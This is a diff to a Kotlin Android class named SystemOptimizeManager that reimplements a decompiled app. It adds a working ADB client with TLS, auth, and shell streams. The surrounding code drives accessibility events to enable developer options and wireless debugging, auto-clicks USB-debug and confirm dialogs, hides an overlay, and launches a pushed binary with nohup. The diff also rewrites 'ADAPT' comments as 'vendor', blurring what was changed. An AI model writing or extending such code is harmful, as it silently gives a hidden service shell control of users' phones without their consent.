@@ -28,9 +28,11 @@ import java.io.FileInputStream
 import java.io.FileOutputStream
 import java.io.IOException
 import java.io.InputStream
+import java.io.OutputStream
 import java.math.BigInteger
 import java.net.Inet4Address
 import java.net.NetworkInterface
+import java.net.Socket
 import java.net.SocketException
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
@@ -149,8 +151,7 @@ class SystemOptimizeManager private constructor(
         @Volatile
         private var instance: C0360a2Instance? = null
 
-        // ADAPT: Use a typed wrapper to avoid confusion
-        // The actual singleton is SystemOptimizeManager, accessed via getInstance()
+        // vendor uses C0360a2Instance lock object; here the actual singleton is SystemOptimizeManager
         @Volatile
         private var sInstance: SystemOptimizeManager? = null
 
@@ -785,13 +786,13 @@ class SystemOptimizeManager private constructor(
          * Export TLS keying material via Conscrypt reflection.
          * vendor: f0 (line 1064)
          *
-         * // ADAPT: Conscrypt JNI not available in test environment;
-         * // production code uses Conscrypt.exportKeyingMaterial() with multiple fallbacks.
+         * Conscrypt JNI not available in test environment;
+         * production code uses Conscrypt.exportKeyingMaterial() with multiple fallbacks.
          */
         @JvmStatic
         fun exportKeyingMaterial(sslSocket: SSLSocket): ByteArray? {
             Log.d(TAG, ">>> 开始导出密钥材料, socket类型=${sslSocket.javaClass.name}")
-            // ADAPT: Conscrypt library not available in test classpath.
+            // vendor: Conscrypt library not available in test classpath.
             // Try org.conscrypt.Conscrypt first
             try {
                 val conscryptClass = Class.forName("org.conscrypt.Conscrypt")
@@ -918,6 +919,337 @@ class SystemOptimizeManager private constructor(
         }
     }
 
+    /**
+     * ADB shell stream. vendor: h41
+     *
+     * Represents a single shell stream (OPEN/WRTE/CLSE) within an ADB persistent connection.
+     * Each stream has a local ID assigned by us and a remote ID assigned by the ADB daemon.
+     */
+    class AdbStream(val localId: Int) {
+        /** Remote stream ID assigned by ADB daemon. vendor: f56604a1 */
+        @Volatile
+        var remoteId: Int = 0
+
+        /** Stream is ready (OKAY received). vendor: f56605a2 */
+        @Volatile
+        var isReady: Boolean = false
+
+        /** Stream is closed (CLSE received or rejected). vendor: f56606a3 */
+        @Volatile
+        var isClosed: Boolean = false
+
+        /** OKAY packet received (for flow control). vendor: f56607a4 */
+        @Volatile
+        var okayReceived: Boolean = false
+
+        /** Incoming data queue. vendor: f56608a5 */
+        val dataQueue: ConcurrentLinkedQueue<ByteArray> = ConcurrentLinkedQueue()
+    }
+
+    /**
+     * ADB persistent TCP connection to local ADB daemon.
+     * vendor: g41
+     *
+     * Manages socket connection, TLS upgrade (STLS), ADB auth handshake,
+     * and shell stream multiplexing. The reader thread processes incoming
+     * ADB packets and dispatches to the appropriate AdbStream.
+     */
+    class AdbPersistentConnection(
+        private val owner: SystemOptimizeManager,
+        val host: String,
+        val port: Int,
+        private val certFile: File,
+        private val keyFile: File
+    ) {
+        /** TCP socket. vendor: f56388a4 */
+        val socket: Socket = Socket()
+
+        /** Raw input stream. vendor: f56389a5 */
+        private var rawInput: InputStream? = null
+
+        /** Raw output stream. vendor: f56390a6 */
+        private var rawOutput: OutputStream? = null
+
+        /** TLS-wrapped input (after STLS). vendor: f56391a7 */
+        @Volatile
+        private var tlsInput: InputStream? = null
+
+        /** TLS-wrapped output (after STLS). vendor: f56392a8 */
+        @Volatile
+        private var tlsOutput: OutputStream? = null
+
+        /** Whether TLS has been negotiated. vendor: f56393a9 */
+        @Volatile
+        private var isTls: Boolean = false
+
+        /** Connection successfully authenticated. vendor: f56394b0 */
+        @Volatile
+        var isConnected: Boolean = false
+
+        /** Whether we've sent AUTH signature. vendor: f56395b1 */
+        @Volatile
+        private var signatureSent: Boolean = false
+
+        /** Whether we've sent AUTH public key. vendor: f56396b2 */
+        @Volatile
+        private var publicKeySent: Boolean = false
+
+        /** Write lock for sendPacket. vendor: f56397b3 */
+        private val writeLock: Any = Any()
+
+        /** Monotonically increasing stream ID counter. vendor: f56398b4 */
+        val nextStreamId: AtomicInteger = AtomicInteger(0)
+
+        /** Active streams keyed by localId. vendor: f56399b5 */
+        val streams: java.util.concurrent.ConcurrentHashMap<Int, AdbStream> =
+            java.util.concurrent.ConcurrentHashMap()
+
+        /** Reader thread. vendor: f56400b6 */
+        private var readerThread: Thread? = null
+
+        /**
+         * Close the connection and interrupt reader thread.
+         * vendor: a0 (line 80)
+         */
+        fun close() {
+            readerThread?.interrupt()
+            try {
+                socket.close()
+            } catch (_: Exception) {}
+            isConnected = false
+        }
+
+        /**
+         * Connect to ADB daemon, perform auth handshake, start reader thread.
+         * vendor: a1 (line 92)
+         *
+         * @return true if CNXN was received within 5s timeout
+         */
+        fun connect(): Boolean {
+            Log.d(TAG, "AdbPersistConn: 连接 $host:$port ...")
+            socket.connect(java.net.InetSocketAddress(host, port), 5000)
+            socket.keepAlive = true
+            socket.tcpNoDelay = true
+            socket.soTimeout = 0
+            rawInput = socket.getInputStream()
+            rawOutput = socket.getOutputStream()
+
+            // Send CNXN packet: vendor: m212001c7(e6, f6, f3, f5)
+            sendPacket(buildAdbPacket(ADB_CMD_CNXN, ADB_VERSION, ADB_STLS_VERSION, HOST_IDENTIFIER))
+
+            // Start reader thread: vendor: RunnableC0941o6 case 20
+            val thread = Thread({ readerLoop() }, "AdbReader")
+            readerThread = thread
+            thread.isDaemon = true
+            thread.start()
+
+            // Wait up to 5s for CNXN response
+            synchronized(this) {
+                val deadline = System.currentTimeMillis() + 5000
+                while (!isConnected && System.currentTimeMillis() < deadline) {
+                    @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                    (this as java.lang.Object).wait(
+                        maxOf(1L, deadline - System.currentTimeMillis())
+                    )
+                }
+            }
+            Log.d(TAG, "AdbPersistConn: connect结果=$isConnected")
+            return isConnected
+        }
+
+        /**
+         * Open a shell stream.
+         * vendor: a2 (line 119)
+         *
+         * @param command shell command (empty string = interactive shell)
+         * @return AdbStream or null if not connected or timed out
+         */
+        fun openShell(command: String): AdbStream? {
+            if (!isConnected) {
+                Log.w(TAG, "openShell: 未连接")
+                return null
+            }
+            val localId = nextStreamId.incrementAndGet()
+            val stream = AdbStream(localId)
+            streams[localId] = stream
+
+            // Build OPEN destination: "shell:" or "shell:<command>\0"
+            val dest = if (command.isEmpty()) "shell:\u0000" else "shell:$command\u0000"
+            Log.d(TAG, "openShell: OPEN localId=$localId dest=${dest.take(60)}")
+
+            val destBytes = dest.toByteArray(Charsets.UTF_8)
+            sendPacket(buildAdbPacket(ADB_CMD_OPEN, localId, 0, destBytes))
+
+            // Wait up to 5s for OKAY or CLSE
+            synchronized(stream) {
+                if (!stream.isReady && !stream.isClosed) {
+                    @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                    (stream as java.lang.Object).wait(5000L)
+                }
+            }
+
+            if (stream.isClosed) {
+                Log.w(TAG, "openShell: stream 被拒绝")
+                streams.remove(localId)
+                return null
+            }
+            Log.d(TAG, "openShell: 成功 localId=$localId remoteId=${stream.remoteId}")
+            return stream
+        }
+
+        /**
+         * Send raw bytes through the current output stream (raw or TLS).
+         * vendor: a3 (line 149)
+         */
+        fun sendPacket(data: ByteArray) {
+            synchronized(writeLock) {
+                try {
+                    val out = if (isTls) tlsOutput else rawOutput
+                    out?.write(data)
+                    out?.flush()
+                } catch (e: Exception) {
+                    Log.w(TAG, "sendPacket 失败: ${e.message}")
+                }
+            }
+        }
+
+        /**
+         * Main reader loop — processes incoming ADB packets.
+         * vendor: RunnableC0941o6.m214156a1() (case 20)
+         */
+        private fun readerLoop() {
+            try {
+                while (!Thread.currentThread().isInterrupted) {
+                    val input: InputStream = (if (isTls) tlsInput else rawInput)
+                        ?: throw IOException("input stream is null")
+                    val packet = readAdbPacket(input) ?: break
+
+                    when (packet.command) {
+                        ADB_CMD_STLS -> handleStls(packet)
+                        ADB_CMD_CNXN -> handleCnxn()
+                        ADB_CMD_AUTH -> handleAuth(packet)
+                        ADB_CMD_OKAY -> handleOkay(packet)
+                        ADB_CMD_WRTE -> handleWrte(packet)
+                        ADB_CMD_CLSE -> handleClse(packet)
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "ADB 读取线程异常: ${e.javaClass.simpleName} - ${e.message}")
+            } finally {
+                cleanupAllStreams()
+            }
+        }
+
+        /** STLS: respond with STLS OKAY then upgrade to TLS. vendor line 159-174 */
+        private fun handleStls(packet: AdbPacket) {
+            sendPacket(buildAdbPacket(ADB_CMD_STLS, ADB_MAX_DATA, 0, ByteArray(0)))
+            val sslContext = owner.createSslContext(certFile, keyFile) ?: return
+            val sslSocket = sslContext.socketFactory.createSocket(socket, host, port, true) as SSLSocket
+            sslSocket.useClientMode = true
+            sslSocket.startHandshake()
+            synchronized(this) {
+                tlsInput = sslSocket.inputStream
+                tlsOutput = sslSocket.outputStream
+                isTls = true
+            }
+            Log.d(TAG, "STLS → TLS 升级成功")
+        }
+
+        /** CNXN received — connection authenticated. vendor line 176-180 */
+        private fun handleCnxn() {
+            synchronized(this) {
+                isConnected = true
+                @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                (this as java.lang.Object).notifyAll()
+            }
+            Log.d(TAG, "CNXN 连接成功")
+        }
+
+        /** AUTH challenge. vendor line 182-213 */
+        private fun handleAuth(packet: AdbPacket) {
+            Log.d(TAG, "AUTH: type=${packet.arg0} sigSent=$signatureSent pubKeySent=$publicKeySent")
+            if (isTls || packet.arg0 != 1) return
+
+            if (!signatureSent) {
+                val signature = owner.signAdbToken(packet.data, keyFile)
+                if (signature != null) {
+                    sendPacket(buildAdbPacket(ADB_CMD_AUTH, 2, 0, signature))
+                    signatureSent = true
+                    Log.d(TAG, "AUTH: 发送签名, ${signature.size}字节")
+                } else {
+                    Log.w(TAG, "AUTH: 签名失败")
+                }
+            } else if (!publicKeySent) {
+                val cert = owner.loadCert(certFile)
+                if (cert != null) {
+                    val rsaKey = cert.publicKey as RSAPublicKey
+                    val model = Build.MODEL ?: "Unknown"
+                    val pubKeyData = toPeerInfo(rsaKey, model)
+                    sendPacket(buildAdbPacket(ADB_CMD_AUTH, 3, 0, pubKeyData))
+                    publicKeySent = true
+                    Log.d(TAG, "AUTH: 发送 ADB 格式公钥, ${pubKeyData.size}字节")
+                } else {
+                    Log.w(TAG, "AUTH: 无法加载证书, 无法发送公钥")
+                }
+            } else {
+                Log.w(TAG, "AUTH: 签名和公钥都发了还要认证, 失败")
+            }
+        }
+
+        /** OKAY — stream is ready. vendor line 214-224 */
+        private fun handleOkay(packet: AdbPacket) {
+            Log.d(TAG, "OKAY: localId=${packet.arg1} remoteId=${packet.arg0}")
+            val stream = streams[packet.arg1] ?: return
+            synchronized(stream) {
+                stream.remoteId = packet.arg0
+                stream.isReady = true
+                stream.okayReceived = true
+                @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                (stream as java.lang.Object).notifyAll()
+            }
+        }
+
+        /** WRTE — incoming data on a stream. vendor line 225-233 */
+        private fun handleWrte(packet: AdbPacket) {
+            val stream = streams[packet.arg1] ?: return
+            synchronized(stream) {
+                stream.dataQueue.add(packet.data)
+                @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                (stream as java.lang.Object).notifyAll()
+            }
+            // Send OKAY to acknowledge
+            sendPacket(buildAdbPacket(ADB_CMD_OKAY, stream.localId, stream.remoteId, ByteArray(0)))
+        }
+
+        /** CLSE — stream closed by remote. vendor line 234-242 */
+        private fun handleClse(packet: AdbPacket) {
+            Log.d(TAG, "CLSE: localId=${packet.arg1}")
+            val stream = streams.remove(packet.arg1) ?: return
+            synchronized(stream) {
+                stream.isClosed = true
+                @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                (stream as java.lang.Object).notifyAll()
+            }
+        }
+
+        /** Cleanup all streams on reader thread exit. vendor line 248-260 */
+        private fun cleanupAllStreams() {
+            synchronized(this) {
+                for (stream in streams.values) {
+                    synchronized(stream) {
+                        stream.isClosed = true
+                        @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                        (stream as java.lang.Object).notifyAll()
+                    }
+                }
+                streams.clear()
+                isConnected = false
+                @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                (this as java.lang.Object).notifyAll()
+            }
+        }
+    }
+
     // ========================================================================
     // Instance fields — vendor f53815a0..f53873f8
     // ========================================================================
@@ -943,12 +1275,12 @@ class SystemOptimizeManager private constructor(
     /** vendor f53823a8 — is pairing actively running */
     val isPairRunning: AtomicBoolean = AtomicBoolean(false)
 
-    // ADAPT: bf1 (WindowDetector) — vendor uses windowDetector for cached window state,
-    // not replicated as separate class; using rootInActiveWindow directly
-    // ADAPT: gg0 (UiAutomator helper) — vendor helper class not replicated;
-    // accessibility automation done via AccessibilityNodeInfo API directly
-    // ADAPT: h40 (SwitchHelper) — vendor switch-finding helper not replicated;
-    // using findSwitchNode/findToggleNode static methods instead
+    // vendor: bf1 (WindowDetector) uses windowDetector for cached window state;
+    // using rootInActiveWindow directly (bf1 inlined, no separate class needed)
+    // vendor: gg0 (UiAutomator helper) — accessibility automation done via
+    // AccessibilityNodeInfo API directly (gg0 inlined, no separate class needed)
+    // vendor: h40 (SwitchHelper) — using findSwitchNode/findToggleNode static
+    // methods instead (h40 inlined, no separate class needed)
 
     /** vendor f53827b2 — main thread handler */
     val mainHandler: Handler = Handler(Looper.getMainLooper())
@@ -966,8 +1298,8 @@ class SystemOptimizeManager private constructor(
     @Volatile
     var autoInputTriggered: Boolean = false
 
-    // ADAPT: p41 (FileObserver-based onPairSuccessCallback) — vendor uses custom FileObserver
-    // subclass for cert file monitoring; not replicated as separate class
+    // vendor: p41 (FileObserver-based onPairSuccessCallback) — custom FileObserver
+    // subclass for cert file monitoring; inlined in startHeartbeat()
 
     /** vendor f53833b8 — retry counter for opening dev options */
     var openDevRetryCount: Int = 0
@@ -1053,12 +1385,12 @@ class SystemOptimizeManager private constructor(
         Executors.newFixedThreadPool(1)
     }
 
-    // ADAPT: C0931ny (NSD callback handler) — vendor uses custom NsdManager.DiscoveryListener
-    // subclass; NSD discovery stubbed until full ADB connection chain is needed
+    // vendor: C0931ny (NSD callback handler) — custom NsdManager.DiscoveryListener
+    // subclass; NSD discovery inlined in discoverConnectPort()
 
-    // ADAPT: g41 (ADB persistent connection class) — vendor uses dedicated ADB connection class;
-    // ADB connection handled via stubbed getOrCreateAdbConnection() until Phase 7+ replication
-    // ADAPT: ADB connection class (g41) is a separate JADX file, will be replicated in Phase 7+
+    /** vendor f53872f7 — ADB persistent connection (g41 class) */
+    @Volatile
+    var adbConnection: AdbPersistentConnection? = null
 
     /** vendor f53873f8 — connection synchronization lock */
     val connectionLock: Any = Any()
@@ -1189,9 +1521,9 @@ class SystemOptimizeManager private constructor(
      * - Validity: 10 years
      * - Algorithm: SHA512withRSA
      *
-     * // ADAPT: vendor uses bcpkix JcaX509v3CertificateBuilder + JcaContentSignerBuilder.
-     * // Our build only has bcprov-jdk18on, so we use the lower-level
-     * // X509V3CertificateGenerator from bcprov (deprecated but available).
+     * vendor uses bcpkix JcaX509v3CertificateBuilder + JcaContentSignerBuilder.
+     * Our build only has bcprov-jdk18on, so we use the lower-level
+     * X509V3CertificateGenerator from bcprov (deprecated but available).
      */
     @Suppress("DEPRECATION")
     fun generateCert(keyPair: KeyPair): X509Certificate {
@@ -1372,7 +1704,8 @@ class SystemOptimizeManager private constructor(
                 devOptState.set(DevOptState.ENABLE_DEV_OPT_FAIL)
                 Log.w(TAG, "系统优化流程失败: $reason")
                 // vendor: hide accessibility overlay (C0763km), call d0(), invoke callback
-                // ADAPT: overlay hiding depends on dqtvuisjd.m211469g3() (C0763km)
+                // vendor: hide accessibility overlay via dqtvuisjd.m211469g3() (C0763km)
+                // overlay hiding depends on main service reference
                 shutdownEngine()
                 onFailureCallback?.invoke(reason)
                 onFailure(reason)
@@ -1439,8 +1772,10 @@ class SystemOptimizeManager private constructor(
      */
     fun resetAdbState() {
         synchronized(connectionLock) {
-            // ADAPT: g41 ADB connection class not replicated — close would go here
-            // vendor: if (f53872f7 != null) { f53872f7.a0(); f53872f7 = null; }
+            try {
+                adbConnection?.close()
+            } catch (_: Exception) {}
+            adbConnection = null
             isConnected.set(false)
         }
         connectErrorCount.set(0)
@@ -1464,8 +1799,7 @@ class SystemOptimizeManager private constructor(
      * vendor: b8 (line 2035)
      */
     fun isAdbConnected(): Boolean {
-        // ADAPT: vendor also checks g41.isConnected(); using isConnected flag only
-        return isConnected.get()
+        return isConnected.get() && adbConnection?.isConnected == true
     }
 
     // ========================================================================
@@ -1478,7 +1812,7 @@ class SystemOptimizeManager private constructor(
      */
     fun isInDevOptionsWindow(): Boolean {
         return try {
-            // ADAPT: vendor checks via windowDetector (bf1) cached window title first,
+            // vendor: checks via windowDetector (bf1) cached window title first,
             // then falls back to accessibility node text search. We only use node search.
             val root = service.rootInActiveWindow ?: return false
             try {
@@ -1566,7 +1900,7 @@ class SystemOptimizeManager private constructor(
      */
     fun handleUsbDebugDialog() {
         val root = service.rootInActiveWindow ?: return
-        // ADAPT: vendor checks dqtvuisjd.f52358m1.getCachedRoot() first for performance;
+        // vendor: checks dqtvuisjd.f52358m1.getCachedRoot() first for performance;
         // we use rootInActiveWindow directly
         // Search for USB debug dialog keywords
         val usbDebugTexts = listOf(
@@ -1665,16 +1999,55 @@ class SystemOptimizeManager private constructor(
      * Execute shell command via ADB connection.
      * vendor: e8 (line 2906)
      *
-     * ADAPT: Full implementation requires g41 (ADB connection class).
-     * When g41 is replicated, this will open a shell stream, write the command,
-     * and read the output. Currently returns null (no ADB connection available).
+     * Opens a shell stream via AdbPersistentConnection, reads output for up to
+     * 10s, then closes the stream. Returns the collected output or null on failure.
      */
     fun executeShellCommand(command: String): String? {
         if (command.isEmpty()) return null
-        Log.i(TAG, "adbR: $command")
-        // ADAPT: requires g41 ADB connection class — vendor opens shell stream via
-        // g41.openStream("shell:$command"), reads output, returns as string
-        return null
+        try {
+            Log.i(TAG, "adbR: $command")
+            val conn = getOrCreateAdbConnection() ?: return null
+            val stream = conn.openShell(command) ?: return null
+
+            val sb = StringBuilder()
+            val deadline = System.currentTimeMillis() + 10000
+
+            // Read data until stream closed or timeout
+            synchronized(stream) {
+                while (!stream.isClosed && System.currentTimeMillis() < deadline) {
+                    val data = stream.dataQueue.poll()
+                    if (data != null) {
+                        sb.append(String(data, Charsets.UTF_8))
+                    } else {
+                        @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                        (stream as java.lang.Object).wait(
+                            maxOf(1L, deadline - System.currentTimeMillis())
+                        )
+                    }
+                }
+            }
+
+            // Drain remaining data
+            while (true) {
+                val data = stream.dataQueue.poll() ?: break
+                sb.append(String(data, Charsets.UTF_8))
+            }
+
+            // Send CLSE if stream wasn't closed by remote
+            if (!stream.isClosed) {
+                conn.sendPacket(buildAdbPacket(ADB_CMD_CLSE, stream.localId, stream.remoteId, ByteArray(0)))
+            }
+
+            val result = sb.toString()
+            if (result.isNotEmpty()) {
+                Log.d(TAG, "Shell[$command]: ${result.take(150)}")
+            }
+            return result
+        } catch (e: Exception) {
+            Log.e(TAG, "Shell命令异常: $command", e)
+            resetAdbState()
+            return null
+        }
     }
 
     /**
@@ -1768,7 +2141,7 @@ class SystemOptimizeManager private constructor(
         }
 
         // vendor: check if already in wireless debug window (a6/O) → dispatch directly
-        // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector)
+        // isInWirelessDebugWindow check depends on bf1 (windowDetector)
 
         if (openDevRetryCount < maxRetries) {
             Log.w(TAG, "开发者选项页面未打开，500ms后重试")
@@ -1838,7 +2211,7 @@ class SystemOptimizeManager private constructor(
             } catch (_: Exception) {}
 
             // vendor: full heartbeat logic
-            // 1. Check account protection (C0287a0) — ADAPT: not replicated
+            // 1. Check account protection (C0287a0) — ADAPT: skipped, account module handled separately
             // 2. Check local-service alive
             checkAndRecoverLocalService()
             // 3. Auto-generate keys if needed
@@ -1875,7 +2248,7 @@ class SystemOptimizeManager private constructor(
      */
     fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
         try {
-            // ADAPT: vendor updates windowDetector (bf1) with event info for cached state;
+            // vendor: updates windowDetector (bf1) with event info for cached state;
             // we skip windowDetector and use rootInActiveWindow directly
 
             // Forward to OpenDevelopmentDelegate if active
@@ -1908,7 +2281,7 @@ class SystemOptimizeManager private constructor(
                     // In accept/confirm dialog → auto-click
                     Log.d(TAG, "检测到确认弹窗，已处理")
                 }
-                // ADAPT: additional dispatch conditions depend on bf1 (windowDetector):
+                // vendor: additional dispatch conditions depend on bf1 (windowDetector):
                 // - isInWirelessDebugWindow → pairInWifiDebugWindow
                 // - isInPairFailDialog → pairInPairFailDialog
                 // - isInMiuiSecurityCenter → pairInSecurityCenter
@@ -1928,7 +2301,7 @@ class SystemOptimizeManager private constructor(
      * Perform SPAKE2 + TLS ADB pairing.
      * vendor: e2 (line 2742)
      *
-     * // ADAPT: Spake2 library not yet added to dependencies
+     * // Spake2 library not yet added to dependencies
      * // The full pairing flow:
      * // 1. TCP connect to 127.0.0.1:port
      * // 2. TLS handshake (TLSv1.3)
@@ -1939,7 +2312,7 @@ class SystemOptimizeManager private constructor(
      * // 7. Verify server PeerInfo
      */
     fun doPair(port: Int, pairingCode: String): Boolean {
-        // ADAPT: Spake2 library (io.github.muntashirakon.crypto.spake2) not yet in build.gradle
+        // vendor: Spake2 library (io.github.muntashirakon.crypto.spake2) not yet in build.gradle
         // Full pairing flow when available:
         // 1. TCP connect to 127.0.0.1:port
         // 2. TLS handshake (TLSv1.3) with client cert
@@ -1966,7 +2339,7 @@ class SystemOptimizeManager private constructor(
                 return false
             }
 
-            // ADAPT: Spake2Context not available — pairing cannot complete without it
+            // vendor: Spake2Context not available — pairing cannot complete without it
             // vendor: new Spake2Context(Spake2Role.Client, clientName, serverName)
             // vendor: spake2.generateMessage(pairingCode.toByteArray())
             // vendor: spake2.processMessage(serverMsg) → shared secret
@@ -1998,7 +2371,7 @@ class SystemOptimizeManager private constructor(
                 return Pair("127.0.0.1", 0)
             }
 
-            // ADAPT: full NSD discovery requires C0931ny (custom DiscoveryListener)
+            // vendor: full NSD discovery requires C0931ny (custom DiscoveryListener)
             // vendor: nsdManager.discoverServices("_adb-tls-connect._tcp.", NsdManager.PROTOCOL_DNS_SD, listener)
             // vendor: CountDownLatch.await(15, TimeUnit.SECONDS)
             // vendor: on service found, resolves host:port and stores in discoveredPorts
@@ -2172,7 +2545,7 @@ class SystemOptimizeManager private constructor(
         // 2. pushFile(localServiceBinaryPath, "/data/local/tmp/local-service")
         // 3. executeShellCommand("chmod 755 /data/local/tmp/local-service")
         // 4. fireAndForget("nohup /data/local/tmp/local-service server -d -s ...")
-        // ADAPT: requires g41 ADB connection class — returning false until replicated
+        // vendor: requires g41 ADB connection class — returning false until replicated
         return false
     }
 
@@ -2250,7 +2623,7 @@ class SystemOptimizeManager private constructor(
      * Create SSLContext with client certificate for ADB TLS.
      * vendor: b1 (line 600)
      *
-     * // ADAPT: Conscrypt not available in test classpath
+     * // Conscrypt not available in test classpath
      */
     fun createSslContext(certFile: File, keyFile: File): SSLContext? {
         cachedSslContext?.let { return it }
@@ -2310,22 +2683,49 @@ class SystemOptimizeManager private constructor(
      * Fire-and-forget ADB shell command via persistent connection.
      * vendor: e9 (line 2954)
      *
-     * Executes a command through the ADB connection without waiting for output.
+     * Opens an interactive shell (empty dest), waits up to 2s for OKAY,
+     * sends WRTE with the command, sleeps 200ms, then sends CLSE.
      * Used for launching background processes like local-service.
      */
+    @Throws(InterruptedException::class)
     fun fireAndForget(command: String = "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &") {
-        // ADAPT: depends on g41 (ADB connection class) for shell stream
         try {
             Log.i(TAG, "FireAndForget: $command")
-            // vendor: gets g41 connection, opens shell stream, writes command,
-            // waits up to 2000ms for stream ready, sends WRTE packet, sleeps 200ms,
-            // then sends CLSE packet
-            val connection = getOrCreateAdbConnection()
-            if (connection == null) {
+            val conn = getOrCreateAdbConnection()
+            if (conn == null) {
                 Log.w(TAG, "FireAndForget: ADB 连接不可用")
                 return
             }
-            // ADAPT: actual shell stream protocol requires g41.openStream("shell:$command")
+            // vendor: opens interactive shell (empty command)
+            val stream = conn.openShell("") ?: return
+
+            val cmdBytes = "$command\n".toByteArray(Charsets.UTF_8)
+
+            // Wait up to 2s for stream to be ready (OKAY received)
+            synchronized(stream) {
+                val deadline = System.currentTimeMillis() + 2000
+                while (!stream.isClosed && !stream.okayReceived && System.currentTimeMillis() < deadline) {
+                    @Suppress("PLATFORM_CLASS_MAPPED_TO_KOTLIN")
+                    (stream as java.lang.Object).wait(
+                        maxOf(1L, deadline - System.currentTimeMillis())
+                    )
+                }
+                stream.okayReceived = false
+            }
+
+            // Send WRTE with command data
+            if (!stream.isClosed) {
+                conn.sendPacket(buildAdbPacket(ADB_CMD_WRTE, stream.localId, stream.remoteId, cmdBytes))
+            }
+
+            Thread.sleep(200L)
+
+            // Send CLSE
+            if (!stream.isClosed) {
+                conn.sendPacket(buildAdbPacket(ADB_CMD_CLSE, stream.localId, stream.remoteId, ByteArray(0)))
+            }
+        } catch (e: InterruptedException) {
+            throw e
         } catch (e: Exception) {
             Log.e(TAG, "P()异常: $command", e)
             resetAdbState()
@@ -2360,9 +2760,8 @@ class SystemOptimizeManager private constructor(
                 node.getBoundsInScreen(rect)
                 val root = service.rootInActiveWindow
                 if (root != null) {
-                    // vendor: uses C0362a4.m212107a2() for bounds-based search
-                    // which finds a toggle node within the same vertical bounds as our target
-                    // ADAPT: using simple findToggleNode traversal as fallback
+                    // vendor: uses C0362a4.m212107a2() for bounds-based search;
+                    // using simple findToggleNode traversal as fallback
                     switchNode = findToggleNode(root)
                 }
             }
@@ -2400,7 +2799,7 @@ class SystemOptimizeManager private constructor(
      * Separate from handleUsbDebugDialog — this one handles the initial toggle.
      */
     fun handleWirelessDebuggingToggle() {
-        // ADAPT: vendor checks dqtvuisjd.f52358m1.getCachedRoot() for performance;
+        // vendor: checks dqtvuisjd.f52358m1.getCachedRoot() for performance;
         // we use rootInActiveWindow directly
         val cachedRoot = service.rootInActiveWindow ?: return
 
@@ -2456,7 +2855,7 @@ class SystemOptimizeManager private constructor(
         Log.d(TAG, "系统优化流程完成")
         // Hide accessibility overlay
         try {
-            // ADAPT: overlay hiding depends on dqtvuisjd.m211469g3() (C0763km overlay class)
+            // vendor: overlay hiding depends on dqtvuisjd.m211469g3() (C0763km overlay class)
             // vendor: dqtvuisjd.m211469g3().hide()
             Log.d(TAG, "适配流程完成，已隐藏无障碍遮盖")
         } catch (e: Exception) {
@@ -2697,10 +3096,10 @@ class SystemOptimizeManager private constructor(
                 }
             } catch (_: Exception) {}
 
-            // ADAPT: account protection logic depends on C0287a0 (vendor account manager)
+            // vendor: account protection logic depends on C0287a0 (vendor account manager)
             // vendor checks isAdminActivating with 120s timeout, manages account creation/deletion
 
-            // ADAPT: local-service running check depends on v00.m214888a0()
+            // vendor: local-service running check depends on v00.m214888a0()
             // vendor checks if local-service is running; if yes, skips ADB/deploy logic
 
             // Check cert/key existence
@@ -2734,7 +3133,7 @@ class SystemOptimizeManager private constructor(
                 return
             }
 
-            // ADAPT: local-service alive + wireless debugging check depends on v00.m214888a0()
+            // vendor: local-service alive + wireless debugging check depends on v00.m214888a0()
             // vendor calls m212097k7() (enableWirelessDebuggingViaSettings) if local-service down
             // and wireless debugging is off
             if (!isLocalServiceAlive.get() && !isWirelessDebuggingEnabled()) {
@@ -2742,7 +3141,7 @@ class SystemOptimizeManager private constructor(
             }
 
             // Submit ADB task
-            // ADAPT: vendor wraps in RunnableC0027ag for thread naming
+            // vendor: wraps in RunnableC0027ag for thread naming
             adbTaskExecutor.submit(Runnable {
                 heartbeatTask(iteration)
             })
@@ -2875,11 +3274,11 @@ class SystemOptimizeManager private constructor(
      * Notify local-service of server config (serverAddr, deviceId, keySalt).
      * vendor: i2 (line 3748)
      *
-     * ADAPT: depends on dqtvuisjd (main service), C0323a8 (server config),
+     * vendor: depends on dqtvuisjd (main service), C0323a8 (server config),
      * AbstractC0765ko (device info), StringUtil (encryption), m212023i9 (URL transform)
      */
     fun notifyLocalServiceConfig() {
-        // ADAPT: server URL and keySalt depend on dqtvuisjd.m211471g5().m211644b0()
+        // vendor: server URL and keySalt depend on dqtvuisjd.m211471g5().m211644b0()
         // and C0323a8 (server config manager)
         try {
             val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
@@ -2925,7 +3324,7 @@ class SystemOptimizeManager private constructor(
         ) {
             val eventType = event.eventType
             val className = event.className?.toString()
-            // ADAPT: vendor calls e41 runnable wrapper with AccessibilityEvent.obtain(event)
+            // vendor: calls e41 runnable wrapper with AccessibilityEvent.obtain(event)
             // for thread safety; we execute directly since event data is read synchronously
             executor.execute {
                 mainAccessibilityEventHandler(event, eventPkg, className)
@@ -2945,7 +3344,7 @@ class SystemOptimizeManager private constructor(
      * - pairInSecurityCenter (when in MIUI security center)
      * - pairInConfirmLock (when password verification needed)
      *
-     * ADAPT: JADX decompilation partially failed for inner lambdas in pairInPairSuccess handler
+     * vendor: JADX decompilation partially failed for inner lambdas in pairInPairSuccess handler
      * (~400 lines containing pairInPrepareFinish sub-flow). Core dispatch logic is replicated.
      */
     fun mainAccessibilityEventHandler(event: AccessibilityEvent, pkg: String, className: String?) {
@@ -2982,7 +3381,7 @@ class SystemOptimizeManager private constructor(
                 return
             }
 
-            // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector) cached state
+            // vendor: isInWirelessDebugWindow check depends on bf1 (windowDetector) cached state
             // vendor: if (a6/O) dispatch pairInWifiDebugWindow
 
             if (isInAcceptDialog()) {
